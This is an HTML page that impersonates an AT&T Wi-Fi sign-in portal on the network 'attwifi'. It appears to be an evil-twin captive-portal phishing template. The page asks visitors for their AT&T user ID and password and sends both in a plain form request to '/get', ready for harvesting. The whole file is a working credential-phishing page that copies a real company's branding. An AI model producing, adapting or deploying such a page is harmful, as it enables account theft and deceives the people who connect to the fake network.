<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.top{width:100%;max-width:420px;background:#00A8E0;border-radius:14px 14px 0 0;padding:18px 24px}
.attlogo{font-size:22px;font-weight:900;color:#fff}
.attlogo span{font-size:11px;font-weight:600;letter-spacing:1px;display:block;color:rgba(255,255,255,0.8);text-transform:uppercase;margin-top:-2px}
.card{background:#fff;width:100%;max-width:420px;border-radius:0 0 14px 14px;box-shadow:0 12px 40px rgba(0,0,0,0.1);overflow:hidden}
.cb{padding:26px 24px 22px}
.badge{display:flex;align-items:center;gap:10px;background:#f0f8fd;border:1px solid #bde0f0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#22c55e;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(34,197,94,0.2)}
.badge span{font-size:12.5px;color:#777}.badge strong{color:#1a1a1a;font-weight:600}
h2{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
.subh{font-size:13px;color:#888;margin-bottom:10px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#00A8E0;box-shadow:0 0 0 3px rgba(0,168,224,0.12)}
input::placeholder{color:#c0c0c0}
.forgot{display:block;text-align:right;font-size:12px;color:#00A8E0;text-decoration:none;margin-top:8px;margin-bottom:6px}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#00A8E0;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
.foot{background:#f7f9fa;border-top:1px solid #e8e8e8;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#00A8E0;text-decoration:none}
</style>
</head>
<body>
<div class="top"><div class="attlogo">AT&amp;T<span>Wi-Fi Services</span></div></div>
<div class="card">
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>attwifi</strong></span></div>
    <h2>Sign In</h2><p class="subh">Enter your AT&T account to get connected.</p>
    <form action="/get">
      <label class="lbl">AT&T User ID or Email</label>
      <input name="username" type="text" placeholder="user@att.net" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <a href="#" class="forgot">Forgot password?</a>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; AT&T Intellectual Property</span><a href="#">Privacy Policy</a></div>
</div>
</body>
</html>
